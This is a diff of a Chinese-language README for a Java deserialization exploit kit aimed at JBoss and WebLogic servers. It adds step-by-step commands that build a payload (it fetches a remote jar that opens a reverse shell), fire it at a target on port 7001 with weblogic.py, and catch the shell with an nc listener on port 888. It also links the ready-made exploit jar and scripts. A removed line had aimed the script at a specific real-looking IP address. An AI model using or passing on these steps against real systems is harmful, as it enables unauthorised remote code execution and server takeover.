@@ -49,14 +49,26 @@ root@Kali:~# java -jar JBossExploit.jar -lhost 123.123.123.123 -lport 999 -rhost
 ```
 ▶ javac -classpath commons-collections-3.2.jar Main.java
 ▶ java Main.class
-▶ python weblogic.py 116.208.2.162 7001 /tmp/payload
+```
+
+Main.java的作用是生成一個從url下載jar包的payload，jar包執行反彈shell。  
+已打包為weblogic.jar，iswin.jar下載地址為原作者提供的地址，有需要重新編譯源碼替換class就好。   
+~~替換成[github](https://github.com/hackzx/JavaDeserialization/raw/master/iswin.jar)的就好。~~
+
+```
+usage:  
+  java -jar weblogic.jar [ip/domain] [port] [out_payload_file]
+
+```
+
+```
+▶ java -jar weblogic.jar [ReverseIP] 888 /tmp/payload
+▶ python weblogic.py [TargetIP] 7001 /tmp/payload
 ▶ ssh kali
 root@Kali:~# nc -vv -l -p 888
 ```
 
-Main.java的作用是生成一個從url下載jar包的payload，jar包執行反彈shell。  
-據說需要java1.6才可以編譯成功，eclipse黨表示未測試。
-
+[weblogic.jar](https://github.com/hackzx/JavaDeserialization/raw/master/weblogic.jar)  
 [commons-collections-3.2.jar](http://archive.apache.org/dist/commons/collections/binaries/commons-collections-3.2.zip "Main.jar依賴包")  
 [Main.java](http://www.iswin.org/2015/11/13/Apache-CommonsCollections-Deserialized-Vulnerability/ "TransformedMap的实现方式")  
 [weblogic.py](https://github.com/schinkelg/JavaUnserializeExploits/blob/master/weblogic.py "自動添加包頭的修正腳本")
